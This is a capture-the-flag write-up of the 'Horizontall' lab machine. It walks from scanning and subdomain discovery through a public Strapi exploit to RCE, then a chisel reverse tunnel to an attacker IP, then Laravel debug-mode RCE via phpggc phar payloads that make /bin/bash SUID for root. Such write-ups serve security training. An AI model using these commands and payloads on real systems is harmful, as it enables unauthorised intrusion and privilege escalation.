# Horizontall

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.84.249
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-30 00:38 EDT
Nmap scan report for 10.129.84.249
Host is up (0.030s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Add `horizontall.htb` to our `/etc/hosts` file to view the website.

### Horizontall Subdomain

This is a typical corporate website advertising a product:

<figure><img src="../../../.gitbook/assets/image (1868).png" alt=""><figcaption></figcaption></figure>

Viewing the page source, we can see a small interesting bit here:

{% code overflow="wrap" %}
```markup
<body><noscript><strong>We're sorry but horizontall doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript><div id="app"></div><script src="/js/chunk-vendors.0e02b89e.js"></script><script src="/js/app.c68eb462.js"></script></body>
```
{% endcode %}

I don't usually come across this, and it appears to be intentionally left there by the creator because the message is customised. We can try to view the JS code that's within this, and perhaps we would find something new. I searched for the box name, and found a new subdomain within the `app.js` file:

<figure><img src="../../../.gitbook/assets/image (1137).png" alt=""><figcaption></figcaption></figure>

Interesting! We can add that to our `hosts` file and view it.&#x20;

### API Reviews

This is what we see when we visit that page:

<figure><img src="../../../.gitbook/assets/image (229).png" alt=""><figcaption></figcaption></figure>

When we head to the `/reviews` directory, we would see some JSON

<figure><img src="../../../.gitbook/assets/image (2756).png" alt=""><figcaption></figcaption></figure>

I ran `gobuster` to scan the directories present on this website and check if we can find anything new.&#x20;

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://api-prod.horizontall.htb -t 100
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://api-prod.horizontall.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/04/30 00:47:53 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 200) [Size: 854]
/users                (Status: 403) [Size: 60]
/reviews              (Status: 200) [Size: 507]
```

Viewing `/admin` would bringus to a `strapi` login page:

<figure><img src="../../../.gitbook/assets/image (252).png" alt=""><figcaption></figcaption></figure>

Googling for exploits pertaining to `strapi` shows this:

{% embed url="https://www.exploit-db.com/exploits/50239" %}

Running the script would spawn a "terminal" for us and also reset the administrator password.

<figure><img src="../../../.gitbook/assets/image (2416).png" alt=""><figcaption></figcaption></figure>

Great! We have RCE. Now, we can easily get a reverse shell.

<figure><img src="../../../.gitbook/assets/image (1664).png" alt=""><figcaption></figcaption></figure>

Grab the user flag within the `developer` user home directory.

## Privilege Escalation

### Port Forwarding

Within the user's home directory, there are some file regarding a project:

```
strapi@horizontall:/home/developer$ ls
composer-setup.php  myproject  user.txt
```

Since there is a PHP file, there might be another application running on another port. We can run `netstat` to check this:

```
strapi@horizontall:/home/developer$ netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1786/node /usr/bin/ 
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           - 
```

We can spawn another shell to port forward this using `chisel`. Since the `strapi` has a home directory, adding an `authorized_keys` file is pretty easy. Then, I downloaded `chisel` via `wget` and ran these commands:

```bash
# on kali
chisel server -p 5555 --reverse
# on victim
chisel client 10.10.14.2:5555 R:8000:127.0.0.1:8000
```

Then we can visit the page!&#x20;

### Laravel Debug RCE

The website just has the default Laravel page:

<figure><img src="../../../.gitbook/assets/image (2991).png" alt=""><figcaption></figcaption></figure>

We can run a directory scan to see what's available.

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://localhost:8000 -t 100
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://localhost:8000
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/04/30 01:27:23 Starting gobuster in directory enumeration mode
===============================================================
/profiles             (Status: 500) [Size: 616204]
```

Interesting. Viewing the `/profiles` leads to a 500 error and brings us to a debug page.

<figure><img src="../../../.gitbook/assets/image (2094).png" alt=""><figcaption></figcaption></figure>

This application enabled the Debug mode and also had Laravel v8 running. It appears to be vulnerable to an older exploit that allows RCE through Laravel Debug mode.

{% embed url="https://github.com/ambionics/laravel-exploits" %}

This exploit uses `phpggc` to create a malicious serialised PHP file that would allow us to execute commands. So, we need to download `phpggc` to the machine and run the following command:

```bash
php -d phar.readonly=0 ./phpggc --phar phar -f -o id.phar monolog/rce1 system id
```

The first part would allow us to create a `phar` file that executes `id` on the system. When we run the exploit, this is what we would get:

```
$ python3 laravel.py http://127.0.0.1:8000 id.phar
+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
uid=0(root) gid=0(root) groups=0(root)
--------------------------
+ Logs cleared
```

Works! Now we just need to specify a longer command. In this case, I decided to make `/bin/bash` an SUID binary. We just need to run these commands again

```bash
php -d phar.readonly=0 ./phpggc --phar phar -f -o suid.phar --fast-destruct monolog/rce1 system 'chmod u+s /bin/bash'
python3 laravel.py http://127.0.0.1:8000 suid.phar
```

Then we can easily get a root shell on the machine.

```
strapi@horizontall:~$ /bin/bash -p
bash-4.4# id
uid=1001(strapi) gid=1001(strapi) euid=0(root) groups=1001(strapi)
```

Rooted!
